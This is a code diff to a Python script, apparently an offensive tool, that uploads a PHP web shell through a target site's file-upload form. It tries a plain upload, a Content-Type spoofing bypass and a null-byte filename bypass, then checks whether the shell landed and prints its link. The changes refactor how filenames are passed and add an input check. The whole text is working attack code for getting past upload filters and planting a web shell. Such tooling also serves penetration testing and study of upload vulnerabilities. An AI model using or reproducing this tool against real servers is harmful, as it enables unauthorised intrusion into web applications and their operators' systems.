@@ -30,11 +30,10 @@ def banner():
     print ''
 
 
-def file_upload(url, upload_file, mime_type, upload_parameter):
-    file_name = os.path.basename(upload_file)
+def file_upload(url, upload_file, file_name, mime_type, upload_parameter):
     files = {upload_parameter: (file_name, open(upload_file, 'rb'), mime_type)}
 
-    print 'Uploading %s to %s' % (upload_file, url)
+    print 'Uploading shell as %s to %s' % (file_name, url)
 
     r = requests.post(url, files=files)
 
@@ -64,53 +63,59 @@ def upload_shell(url, shell_location, upload_parameter, upload_dir):
     print 'Simple Upload'
 
     mime_type = 'text/x-php'
-    shell_file = os.path.basename(shell_location)
+    shell_filename = os.path.basename(shell_location)
 
-    file_upload(url, shell_location, mime_type, upload_parameter)
+    file_upload(url, shell_location, shell_filename, mime_type, upload_parameter)
 
-    if file_check(upload_dir, shell_file):
-        print 'Upload successful at %s%s' % (upload_dir, shell_file)
+    if file_check(upload_dir, shell_filename):
+        print 'Upload successful at %s%s' % (upload_dir, shell_filename)
     else:
         print 'Upload failed or file renamed'
+
+    print ''
 
 
 def bypass_content_type(url, shell_location, mime_type, upload_parameter, upload_dir):
     """
-    attempt to upload shell by changing the mime type to a supported file type
+    attempt to upload shell by changing the mime type to a supported one
     """
     print 'Content Type Bypass'
 
-    shell_file = os.path.basename(shell_location)
+    shell_filename = os.path.basename(shell_location)
 
-    file_upload(url, shell_location, mime_type, upload_parameter)
+    file_upload(url, shell_location, shell_filename, mime_type, upload_parameter)
 
-    if file_check(upload_dir, shell_file):
-        print 'Upload successful at %s%s' % (upload_dir, shell_file)
+    if file_check(upload_dir, shell_filename):
+        print 'Upload successful at %s%s' % (upload_dir, shell_filename)
     else:
         print 'Upload failed or file renamed'
+
+    print ''
 
 
 def bypass_nullbyte(url, shell_location, mime_type, accepted_filetypes, upload_parameter, upload_dir):
 
-    shell_file = os.path.basename(shell_location)
-    nullbyte_file_location = files_folder + shell_file + '%00.' + accepted_filetypes
-    copyfile(shell_location, nullbyte_file_location)
+    shell_filename = os.path.basename(shell_location)
+    #nullbyte_file_location = files_folder + shell_file + '%00.' + accepted_filetypes
+    #copyfile(shell_location, nullbyte_file_location)
 
-    nullbyte_file = os.path.basename(nullbyte_file_location)
+    nullbyte_filename = shell_filename + '%00' + accepted_filetypes
 
 
     print 'Null Byte Bypass'
 
-    file_upload(url, nullbyte_file_location, mime_type, upload_parameter)
+    file_upload(url, shell_location, nullbyte_filename, mime_type, upload_parameter)
 
-    if file_check(upload_dir, shell_file):
-        print 'Upload successful. Shell link %s' % ''.join([url, shell_file])
+    if file_check(upload_dir, shell_filename):
+        print 'Upload successful. Shell link %s' % ''.join([url, shell_filename])
     else:
         print 'Shell not found on server. Checking if nullbyte ignored'
-        if file_check(upload_dir, nullbyte_file):
-            print 'Upload successful but nullbyte ignored. File link %s' % ''.join([url, nullbyte_file])
+        if file_check(upload_dir, nullbyte_filename):
+            print 'Upload successful but nullbyte ignored. File link %s' % ''.join([url, nullbyte_filename])
         else:
             print 'Upload failed or file renamed'
+
+    print ''
 
 
 
@@ -165,5 +170,7 @@ if __name__ == "__main__":
         required=True)
 
     results = parser.parse_args()
+    if not os.path.isfile(results.shell):
+        sys.exit("%s not found" % results.shell)
     banner()
     run_me(results.url, results.shell, results.upload_dir, results.accepted_filetypes, results.upload_paramater)
